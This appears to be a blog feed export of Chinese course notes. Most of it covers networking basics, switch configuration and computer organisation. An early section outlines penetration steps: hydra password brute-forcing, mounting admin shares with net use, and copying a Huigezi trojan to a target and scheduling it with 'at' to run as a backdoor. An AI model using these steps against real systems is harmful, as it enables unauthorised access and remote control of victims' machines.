title="渗透简单测试"></a>渗透简单测试</h2><ol><li>授权</li><li>信息收集<br>nslookup、whois、</li><li>扫描漏洞<br>namp=ip范围 端口(IIS、apache，什么网站)<br>高级扫描：<br>如IIS漏洞2003-IIS6.0、2008-IIS7.0<br>扫描网站漏洞</li><li>漏洞利用</li><li>提权(shell环境、桌面、最高权限)</li></ol><hr><ol start="6"><li>毁尸灭迹</li><li>留后门</li><li>渗透测试报告</li></ol><hr><p>手工测试端口号开放：<br>telnet IP地址 测试端口</p><ol><li><p>scanport扫描445端口</p></li><li><p>漏洞利用之IPC$:<br>进行暴力破解:NTscan<br>暴力破解系统密码之445</p></li><li><p>命令行控制对方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use f: \\ip地址\文件夹 密码 &#x2F;user:用户</span><br><span class="line">net use f： &#x2F;del</span><br><span class="line">net use * &#x2F;del</span><br><span class="line">net use f: \\ip地址\c$ 密码 &#x2F;user:用户</span><br><span class="line">net use f: \\ip地址\ipc$ 密码 &#x2F;user:用户</span><br></pre></td></tr></table></figure></li><li><p>制作木马<br>灰鸽子软件制作木马</p></li><li><p>copy植入木马(留后门)<br>copy D:\muma.exe \ip地址\c$</p></li><li><p>设置计划任务自动执行木马：<br>net time \ip地址<br>at \ip地址 时间 “路径”<br>等待</p></li><li><p>等待肉鸡上线</p></li></ol><h1 id="扫描与爆破"><a href="#扫描与爆破" class="headerlink" title="扫描与爆破"></a>扫描与爆破</h1><p>nmap、hydra</p><h2 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h2><p>手工与工具想结合</p><p>主机探测与端口扫描<br>主机探测是指确定目标主机是否存活<br>端口扫描就是寻找在线主机所开放的端口，并且在端口上所运行的服务。甚至可以进一步确定目标主机操作系统类型和更详细的信息</p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><table><thead><tr><th align="center">端口号</th><th align="center">协议</th><th align="center">端口号</th><th align="center">协议</th></tr></thead><tbody><tr><td align="center">21</td><td align="center">FTP</td><td align="center">44</td><td align="center">HTTPS</td></tr><tr><td align="center">22</td><td align="center">SSH</td><td align="center">1433</td><td align="center">SQL Server</td></tr><tr><td align="center">23</td><td align="center">Telnet</td><td align="center">1521</td><td align="center">Oracle</td></tr><tr><td align="center">25</td><td align="center">SMTP</td><td align="center">3306</td><td align="center">MySQL</td></tr><tr><td align="center">80</td><td align="center">HTTP</td><td align="center">3389</td><td align="center">RDP</td></tr></tbody></table><p>nmap–扫描器之王</p><p>重要常用参数：</p><table><thead><tr><th align="center">参数</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">-sP</td><td align="center">ping</td></tr><tr><td align="center">-p</td><td align="center">指定端口范围</td></tr><tr><td align="center">-sV</td><td align="center">服务版本探测</td></tr><tr><td align="center">-O</td><td align="center">启用操作系统探测</td></tr><tr><td align="center">-A</td><td align="center">全面扫描</td></tr><tr><td align="center">-oN</td><td align="center">保存txt</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 10.1.1.1&#x2F;24 (ip地址&#x2F;24) 扫描10.1.1.0整个网段</span><br><span class="line">nmap -p 21,23-25,3389 10.1.1.1&#x2F;24 扫描端口</span><br><span class="line">nmap -p 21,23 10.1.1.1 -sV 扫描21,23的服务版本</span><br><span class="line">nmap -A 10.1.1.1 全面扫描</span><br><span class="line">nmap -O 10.1.1.1 扫描目标系统版本</span><br><span class="line">nmap -p 21,23 10.1.1.1 -oN d:\result.text 生成扫描文档</span><br></pre></td></tr></table></figure><p>九头蛇 hydra<br><code>hydra -l 用户名 -p 123 10.1.1.1 telnet</code></p><p>如：(pass.txt需要提前建立)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hydra -l a -p e:\pass.txt 10.1.1.1 telnet</span><br><span class="line">hydra -l a -p e:\pass.txt 10.1.1.1 rdp</span><br><span class="line">hydra -l a -p e:\pass.txt 10.1.1.1 smb</span><br><span class="line">hydra -l a -p e:\pass.txt 10.1.1.1 ftp</span><br><span class="line">hydra -l a -p e:\pass.txt 10.1.1.1 ssh</span><br><span class="line">hydra -l a -p e:\pass.txt 10.1.1.1 mysql</span><br><span class="line">hydra -L e:\user.txt -P e:\pass.txt 10.1.1.1 telnet</span><br></pre></td></tr></table></figure><h1 id="OSI与TCP-IP5层协议"><a href="#OSI与TCP-IP5层协议" class="headerlink" title="OSI与TCP-IP5层协议"></a>OSI与TCP-IP5层协议</h1><h2 id="分层模型"><a href="#分层模型" class="headerlink" title="分层模型"></a>分层模型</h2><h3 id="分层思想"><a href="#分层思想" class="headerlink" title="分层思想"></a>分层思想</h3><p>通信需求 -&gt; 定义协议标准</p><p>完成每一件事，需要的协议太多！怎么办？—-分层</p><p>将<code>复杂的流程</code>分解为<code>几个功能相对单一的子过程</code></p><ol><li>整个流程更加清晰，<code>复杂问题简单化</code></li><li>更容易发现问题并针对性的解决问题</li></ol><p>下层为上层服务</p><h3 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h3><p>Open System interconnection<br>OSI七层模型</p><img src="/2020/06/10/%E5%8D%83%E5%B3%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B.png" class=""><h3 id="TCP-IP-5层协议簇-协议栈"><a href="#TCP-IP-5层协议簇-协议栈" class="headerlink" title="TCP/IP 5层协议簇/协议栈"></a>TCP/IP 5层协议簇/协议栈</h3><p>层与设备的对应关系<br>传输 | 层 | 举例 | 协议<br>:—-:  | :—-: | :—-: |:—-:|<br>数据/PDU | 应用层 | PC/防火墙 | HTTP(80) HTTPS(443) SSH(22) Telnet(23) FTP(20/21) DHCP(67/68) SMTP(25) POP3(110) RDP(3389) SMB(445) Mysql(3306) DNS(53)<br>数据段/段Fragment | 传输层 | 防火墙 | TCP UDP<br>报文/包packet/IP包 | 网络层 | 路由器 | ICMP IP ARP<br>帧Frame | 数据链路层 | 交换机/网卡 | MAC子层协议<br>比特bit | 物理层 | 网线 | 比特流</p><img src="/2020/06/10/%E5%8D%83%E5%B3%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%B0%81%E8%A3%85%E5%85%B3%E8%81%94%E5%9B%BE.jpg" class=""><p>1 Byte字节 = 8 bit位</p><h2 id="数据传输过程"><a href="#数据传输过程" class="headerlink" title="数据传输过程"></a>数据传输过程</h2><h3 id="数据封装与解封装过程"><a href="#数据封装与解封装过程" class="headerlink" title="数据封装与解封装过程"></a>数据封装与解封装过程</h3><p>各层间通信</p><h2 id="物理层-physical-layer"><a href="#物理层-physical-layer" class="headerlink" title="物理层 physical layer"></a>物理层 physical layer</h2><ol><li>网线/光纤/空气</li><li>比特bit<br>1 Byte字节 = 8 bit位<br>1024 B = 1 KB<br>1024 KB = 1 MB<br>1024 MB = 1 GB<br>1024 GB = 1 TB<br>1024 TB = 1 PB</li><li>信号：(模拟信号、数字信号) = 电信号<br>放大器、中继器<br>光信号：<br>光纤类型：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">单模光纤:一般黄色</span><br><span class="line">多模光纤:一般橙色&#x2F;蓝色</span><br></pre></td></tr></table></figure></li><li>网线/双绞线<br>5类双绞线<br>超5类<br>6类 7类<br>T568A:白绿、绿、白橙、蓝、白蓝、橙、白棕、棕<br>T568B:白橙、橙、白绿、蓝、白蓝、绿、白棕、棕<br>网线的用途分类：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">交叉线：一端为A，一端为B，同种设备间使用！</span><br><span class="line">直通线：两端都是A或都是B，异种设备间使用！</span><br><span class="line">全反线：一端为A，另一端为反A，也称console线</span><br></pre></td></tr></table></figure></li></ol><h2 id="PT软件"><a href="#PT软件" class="headerlink" title="PT软件"></a>PT软件</h2><p>Ethernet 10Mb/s<br>FastEthernet 100Mb/s<br>GigabitEthernet 1000Mb/s<br>TenGigabitEthernet 10000Mb/s</p><p>f1/4<br>g0/3<br>0：模块号<br>3：接口号</p><h2 id="数据链路层-2层-Data-Link-Layer"><a href="#数据链路层-2层-Data-Link-Layer" class="headerlink" title="数据链路层(2层 Data Link Layer)"></a>数据链路层(2层 Data Link Layer)</h2><h3 id="属于2层"><a href="#属于2层" class="headerlink" title="属于2层"></a>属于2层</h3><h3 id="传输单元：帧"><a href="#传输单元：帧" class="headerlink" title="传输单元：帧"></a>传输单元：帧</h3><h3 id="帧结构："><a href="#帧结构：" class="headerlink" title="帧结构："></a>帧结构：</h3><p>类型字段的作用：识别上层协议，为上层提供服务</p><img src="/2020/06/10/%E5%8D%83%E5%B3%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%B8%A7%E7%BB%93%E6%9E%84.png" class=""><p>MAC地址：也叫物理地址，是全球唯一的！长度：48位、6字节<br>帧头：6+6+2=14字节(目标MAC6字节、源MAC6字节、类型2字节)<br>帧尾：4字节<br>最长的帧：1518字节<br>MTU值：1500字节(国内1500字节)<br>0x0800：上层为IP协议<br>0x0806：上层为ARP协议</p><h3 id="工作在数据链路层的设备"><a href="#工作在数据链路层的设备" class="headerlink" title="工作在数据链路层的设备"></a>工作在数据链路层的设备</h3><p>交换机/网卡<br><strong>交换机工作原理</strong><br>AA-&gt;DD</p><img src="/2020/06/10/%E5%8D%83%E5%B3%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%861.png" class=""><p>MAC地址表越完整越好</p><img src="/2020/06/10/%E5%8D%83%E5%B3%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%862.png" class=""><p><code>收到一个数据帧后：</code><br>首先学习帧中的源MAC地址来形成MAC地址表(如果有的话看看跟之前的表是否吻合，不吻合则更新)<br>然后检查帧中的目标MAC地址，并匹配MAC地址表(如表中有匹配项，则单播转发；如表中无匹配项，则除接收端口外广播转发)<br>MAC地址表的老化时间默认300s(可修改)</p><h3 id="交换机的端口"><a href="#交换机的端口" class="headerlink" title="交换机的端口"></a>交换机的端口</h3><p>E 10Mb<br>F 100Mb<br>G 1000Mb<br>Te 10000Mb<br>F0/1   0模块号  1接口号<br>接口速率自适应：1000/100/10M自适应<br>速率工作模式可以为10，100，1000任何一种状态<br>端口状态：up/down<br>down3种可能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">人工down掉</span><br><span class="line">速率不匹配</span><br><span class="line">双工模式不匹配(双工duplex)(单工、半双工、全双工)</span><br></pre></td></tr></table></figure><h3 id="交换机基本工作模式及命令"><a href="#交换机基本工作模式及命令" class="headerlink" title="交换机基本工作模式及命令"></a>交换机基本工作模式及命令</h3><p>第一次配置网络设备，需要使用console线<br>在PC需要使用“超级终端”或其他软件<br><strong>用户模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">switch&gt;</span><br><span class="line">可以查看交换机的基本简单信息，且不能做任何修改配置！</span><br></pre></td></tr></table></figure><p><strong>特权模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">switch&gt; enable</span><br><span class="line">switch#</span><br><span class="line">可以查看所有配置，且不能修改配置，但可以做测试、保存、初始化等操作</span><br></pre></td></tr></table></figure><p><strong>全局配置模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">switch# configure terminal</span><br><span class="line">switch(config)#</span><br><span class="line">默认不能查看配置！可以修改配置，且全局生效！</span><br></pre></td></tr></table></figure><p><strong>接口配置模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">switch(config)# interface f0&#x2F;1(接口编号)</span><br><span class="line">switch(config-if)#</span><br><span class="line">默认不能查看配置！可以修改配置，且对该端口生效！</span><br></pre></td></tr></table></figure><p><code>exit</code>退出一级<br><strong>console口/线/控制台 模式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">switch(config)#line console 0</span><br><span class="line">switch(config-line)#</span><br><span class="line">默认不能查看配置！可以修改配置，且对console口生效！</span><br></pre></td></tr></table></figure><p><strong>琐碎</strong><br>exit退出一级<br>end直接退到特权模式<br>支持命令缩写<br>？的用法<br>历史命令<br>tab补全键<br>ctrl+u：快速删除光标全所有字符<br>ctrl+a：快速定位光标到行首<br>ctrl+e：快速定位光标到行尾</p><p><strong>实际应用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">配置主机名</span><br><span class="line">switch# configure terminal</span><br><span class="line">switch(config)#</span><br><span class="line">switch(config)#hostname sw1</span><br><span class="line">sw1(config)#hostname sw-bj-01-04(设备名)</span><br><span class="line"></span><br><span class="line">设置用户密码</span><br><span class="line">sw1(config)#line console 0</span><br><span class="line">sw1(config-line)#pass</span><br><span class="line">sw1(config-line)#password ******</span><br><span class="line">sw1(config-line)#login</span><br><span class="line"></span><br><span class="line">保存配置</span><br><span class="line">switch&gt; enable</span><br><span class="line">switch&gt;copy running-config startup-config</span><br><span class="line">或者</span><br><span class="line">write(不普遍适用)</span><br><span class="line"></span><br><span class="line">查看running-config配置</span><br><span class="line">switch&gt; enable</span><br><span class="line">switch# show running-config  (简写：sh run)</span><br><span class="line"></span><br><span class="line">查看startup-config配置</span><br><span class="line">show startup-config</span><br><span class="line"></span><br><span class="line">重启设备</span><br><span class="line">switch&gt; enable</span><br><span class="line">switch# reload</span><br><span class="line"></span><br><span class="line">配置特权密码：</span><br><span class="line">switch# configure terminal</span><br><span class="line">switch(config)#</span><br><span class="line">switch(config)# enable password 密码(明文)</span><br><span class="line">switch(config)# enable secret 密码(密文)</span><br><span class="line"></span><br><span class="line">查看MAC地址表：</span><br><span class="line">switch# show mac-address-table</span><br><span class="line"></span><br><span class="line">查看接口列表：</span><br><span class="line">switch# show ip interface brief</span><br><span class="line">switch# sh int b</span><br><span class="line"></span><br><span class="line">手工关闭接口</span><br><span class="line">switch(config)# interface f0&#x2F;1(接口编号)</span><br><span class="line">switch(config-if)# shutdown</span><br><span class="line">switch(config-if)# exit</span><br><span class="line"></span><br><span class="line">手工开启接口：</span><br><span class="line">switch(config)# interface f0&#x2F;1(接口编号)</span><br><span class="line">switch(config-if)# no shutdown</span><br><span class="line">switch(config-if)# exit</span><br><span class="line"></span><br><span class="line">do的用法：</span><br><span class="line">其他模式加do空格可以强制使用特权模式的命令</span><br><span class="line">如：</span><br><span class="line">do sh run</span><br><span class="line">do sh ip int b</span><br><span class="line">do wr</span><br><span class="line"></span><br><span class="line">删除配置：</span><br><span class="line">在哪配置的，就在哪删！</span><br><span class="line">命令前加no空格</span><br><span class="line">原命令中有参数，并且参数具有唯一性，则删除时不需要加参数</span><br><span class="line">如：</span><br><span class="line">switch# configure terminal</span><br><span class="line">switch(config)#hostname sw1</span><br><span class="line"></span><br><span class="line">switch# configure terminal</span><br><span class="line">switch(config)#no hostname</span><br><span class="line"></span><br><span class="line">清空&#x2F;擦除&#x2F;初始化配置</span><br><span class="line">switch&gt; enable</span><br><span class="line">switch# erase startup-config</span><br><span class="line"></span><br><span class="line">为3层端口配置IP：</span><br><span class="line">switch(config)# interface f0&#x2F;1(接口编号)</span><br><span class="line">switch(config-if)# ip add 10.1.1.254 255.255.255.0</span><br><span class="line">switch(config-if)# no shutdown</span><br><span class="line">switch(config-if)# exit</span><br></pre></td></tr></table></figure><p>在内存中存在一个文件：<code>running-config</code>；第一次开机，系统会在内存中自动创建一个新的干净的running-config<br>hostname password</p><p><code>交换机开机动作</code>：先去硬盘中查找startup-config是否存在，如果不存在，在内存中创建新的running-config；如果存在，则复制到内存中并改名为running-config</p><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><p>学会简单的抓包<br>验证TCP/IP协议栈结构<br>验证帧结构</p><h1 id="IP包头分析与静态路由"><a href="#IP包头分析与静态路由" class="headerlink" title="IP包头分析与静态路由"></a>IP包头分析与静态路由</h1><h2 id="路由原理"><a href="#路由原理" class="headerlink" title="路由原理"></a>路由原理</h2><h3 id="IP包头分析"><a href="#IP包头分析" class="headerlink" title="IP包头分析"></a>IP包头分析</h3><p>IP数据包格式</p><img src="/2020/06/10/%E5%8D%83%E5%B3%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/IP%E6%95%B0%E6%8D%AE%E5%8C%85%E6%A0%BC%E5%BC%8F.png" class=""><p>IP包头：20-60字节<br>版本(4)：ipv4/ipv6<br>首部长度(4)：声明ip包头有无可选项，正常为20字节，0101单位4B<br>优先级与服务类型(8)：优先级3比特，服务类型4比特，最后1比特未使用<br>段偏移量(13)：0、1480、2960….(1480的倍数)分片先后的顺序<br>标示符(16)：标识同一个数据报文的所有分片<br>标志(3)：第一位无用，第二位表示是否分片，最后一位表示是不是最后一个分片<br>总长度(16)：IP报文的总长度，345层的总长度<br>TTL(8)：防止一个数据包在网络上永久循环</p><h3 id="路由器工作原理"><a href="#路由器工作原理" class="headerlink" title="路由器工作原理"></a>路由器工作原理</h3><p>路由：跨越从源主机到目标主机的一个互联网络来转发数据包的过程(路由器为IP包选择路径的过程)</p><h3 id="路由表的形成"><a href="#路由表的形成" class="headerlink" title="路由表的形成"></a>路由表的形成</h3><h2 id="静态路由和默认路由"><a href="#静态路由和默认路由" class="headerlink" title="静态路由和默认路由"></a>静态路由和默认路由</h2><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><h3 id="默认路由"><a href="#默认路由" class="headerlink" title="默认路由"></a>默认路由</h3><h3 id="路由器转发数据包的封装过程"><a href="#路由器转发数据包的封装过程" class="headerlink" title="路由器转发数据包的封装过程"></a>路由器转发数据包的封装过程</h3><h3 id="交换与路由对比"><a href="#交换与路由对比" class="headerlink" title="交换与路由对比"></a>交换与路由对比</h3><h2 id="静态路由和默认路由的配置"><a href="#静态路由和默认路由的配置" class="headerlink" title="静态路由和默认路由的配置"></a>静态路由和默认路由的配置</h2><h3 id="静态路由配置命令"><a href="#静态路由配置命令" class="headerlink" title="静态路由配置命令"></a>静态路由配置命令</h3>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
      <url>/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>计算机组成原理，好难啊啊啊啊啊</p><a id="more"></a><h1 id="计算机系统概论"><a href="#计算机系统概论" class="headerlink" title="计算机系统概论"></a>计算机系统概论</h1><h2 id="计算机性能指标"><a href="#计算机性能指标" class="headerlink" title="计算机性能指标"></a>计算机性能指标</h2><p><strong>吞吐量</strong>：表征一台计算机在某一时间间隔内能够处理的信息量，单位是字节/秒（B/s）。</p><p><strong>响应时间</strong>：表征从输入有效到系统产生响应之间的时间度量，用时间单位来度量，例如微秒us（10^(-6)s）、纳秒ns（10^(-9)s）。</p><p><strong>利用率</strong>：在给定的时间间隔内，系统被实际使用的时间所占的比率，一般用百分比表示。</p><p><strong>处理机字长</strong>：指处理机运算器中一次能够完成二进制数运算的位数，决定了寄存器和数据总线的位数。当前处理机的字长有8位、16位、32位、64位。</p><p>字长越长，包含的信息量越多，精度越高，硬件成本也越高</p><p><strong>总线宽度</strong>：一般指CPU中运算器与存储器之间进行互连的内部总线二进制位数。</p><p><strong>存储容量</strong>：存储器中所有存储单元的总数目，通常用KB、MB、GB、TB来表示。其中K=2^10，M=2^20，G=2^30，T=2^40，B=8位（1个字节）。</p><p>存储器容量越大，记忆的二进制数越多。有内存容量和辅存容量两种指标。存储容量越大，能存储的信息就越多。<br>                    1KB=1024B，1MB=1024KB，<br>                    1GB=1024MB，1TB=1024GB</p><p><strong>存储器带宽</strong>：存储器的速度指标，单位时间内从存储器读出的二进制数信息量，一般用<code>字节数/秒</code>表示。<br>带宽的计算：<code>存储带宽</code>、<code>总线带宽</code>、<code>显示带宽</code>等<br>通信中的带宽使用的单位有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“千比特&#x2F;秒”(kb&#x2F;s)，     1kbps &#x3D; 103 b&#x2F;s &#x3D;1000 bps</span><br><span class="line">“兆比特&#x2F;秒”(Mb&#x2F;s)，   1Mbps &#x3D; 106 b&#x2F;s &#x3D;1000 kbps</span><br><span class="line">“千兆比特&#x2F;秒”(Gb&#x2F;s)，1Gbps &#x3D; 109 b&#x2F;s &#x3D;1000 Mbps</span><br><span class="line">“兆兆比特&#x2F;秒”(Tb&#x2F;s)， 1Tbps &#x3D; 1012b&#x2F;s &#x3D;1000 Gbps</span><br></pre></td></tr></table></figure><p>如果把b换成B，则表示字节而不是比特（位），例如，10MBps表示 10兆字节/秒。</p><p><strong>主频/时钟周期</strong>：CPU的工作节拍受主时钟控制，主时钟不断产生固定频率的时钟，<code>主时钟的频率（f）</code>叫CPU的<code>主频</code>。度量单位是MHz、GHz。<br>    例如Pentium系列机为60MHz～266MHz，而Pentium 4升至3.6GHz。<br><code>主频的倒数</code>称为<code>CPU时钟周期</code>（T），即<code>T=1/f</code>，度量单位是<code>微秒us</code> 、<code>纳秒ns</code>。</p><p><strong>CPU执行时间</strong>：表示CPU执行一段程序所占用的CPU时间，可用下式计算：<br>    <code>CPU执行时间 ＝ CPU时钟周期数 × CPU时钟周期长（T）</code></p><p><strong>CPI</strong>：每条指令周期数，即执行一条指令所需的平均时钟周期数。<br>           <code>CPI = &quot;执行某段程序所需的CPU时钟周期数&quot; /&quot;程序包含的指令条数&quot;</code></p><p><strong>MIPS</strong>：每秒百万条指令数，表示单位时间内执行的指令数目。<br>           <code>MIPS = &quot;指令条数&quot; /&quot;程序执行时间×10^6&quot;  = &quot;时钟频率&quot; /&quot;CPI×10^6&quot;  = &quot;f&quot; /&quot;CPI×10^6&quot;</code></p><p><strong>MFLOPS</strong>：每秒百万次浮点操作次数，用来衡量机器浮点操作的性能。<br><code>MIPS</code>是单位时间内的执行指令数，所以MIPS值越高说明机器速度越快。<br><code>MFLOPS</code>是基于操作而非指令的，只能用来衡量机器浮点操作的性能，而不能体现机器的整体性能。<br><code>TFLOPS</code>表示每秒万亿次浮点操作次数，该技术指标一般在超级计算机中使用。</p><h2 id="计算机的硬件"><a href="#计算机的硬件" class="headerlink" title="计算机的硬件"></a>计算机的硬件</h2><h3 id="硬件组成要素"><a href="#硬件组成要素" class="headerlink" title="硬件组成要素"></a>硬件组成要素</h3><p>存储器、运算器、控制器、输入设备、输出设备</p><h3 id="运算器"><a href="#运算器" class="headerlink" title="运算器"></a>运算器</h3><p>算术运算 和 逻辑运算，称为<code>ALU</code>(算数逻辑运算部件)<br>参与运算的数是<code>二进制</code>的<br>数的位数越多，计算的精度就越高<br>位数越多，所需电子器件也越多，一般8位、16位、32位、64位</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/ALU.png" class=""><h3 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h3><p>通常，在存储器中把保存一个数的若干个触发器称为一个<code>存储单元</code>，<code>存储器是由许多存储单元组成的</code></p><p>每个存储单元都有编号，称为<code>地址</code></p><p>向存储器中存数或者从存储器中取数，都要按给定的地址来寻找所选的存储单元。</p><p>存储器所有存储单元的总数称为存储器的<code>存储容量</code>，通常用单位KB，MB，GB，TB等来表示，如64KB，128MB。</p><p>存储容量越大，表示计算机记忆储存的信息就越多。</p><p>半导体存储器的存储容量毕竟有限，因此计算机中又配备了存储容量更大的磁盘存储器和光盘存储器，称为外存储器，简称<code>外存</code></p><p>相对而言，半导体存储器称为内存储器，简称<code>内存</code></p><h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><h4 id="指令的形式"><a href="#指令的形式" class="headerlink" title="指令的形式"></a>指令的形式</h4><p>指令由两部分组成：<code>操作的性质</code>（操作码）和<code>操作数的地址</code>（地址码）。</p><p>计算机的<code>所有指令</code>构成该计算机的<code>指令系统</code>，指令系统不仅是<code>硬件设计的依据</code>，而且是<code>软件设计的基础</code>，是衡量计算机性能的一个重要指标。</p><p>指令的<code>操作码</code>和<code>地址码</code>都用<code>二进制代码</code>来表示。<code>操作码需要编码，而地址码则不需要</code>。</p><p>存储器的任何位置可以存放数据，也可以存放指令，一般将指令和数据分开存放。</p><p>将解题的程序（指令序列）存放到存储器中称为<code>存储程序</code>，而控制器依据存储的程序来控制全机协调完成计算任务称为<code>程序控制</code>。</p><p><code>指令和数据放在同一个存储器中，存储程序并按地址顺序执行</code>，这就是冯·诺依曼型计算机的体系结构。</p><p>如果指令和数据分别放在两个存储器中，称为<code>哈佛结构</code>。</p><p><strong>冯·诺依曼结构的主要思想</strong></p><ol><li>计算机应由运算器、控制器、存储器、输入设备和输出设备五个基本部件组成。</li><li>各基本部件的功能是：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">存储器不仅能存放数据，而且也能存放指令，形式上两者没有区别，但计算机应能区分数据还是指令；</span><br><span class="line">控制器应能自动取出指令来执行；</span><br><span class="line">运算器应能进行加&#x2F;减&#x2F;乘&#x2F;除四种基本算术运算，并且也能进行一些逻辑运算和附加运算；</span><br><span class="line">操作人员可以通过输入设备、输出设备和主机进行通信。</span><br></pre></td></tr></table></figure></li><li>内部以二进制表示指令和数据。每条指令由操作码和地址码两部分组成。操作码指出操作类型，地址码指出操作数的地址。由一串指令组成程序。</li><li>采用“存储程序”工作方式。</li></ol><h4 id="控制器的基本任务"><a href="#控制器的基本任务" class="headerlink" 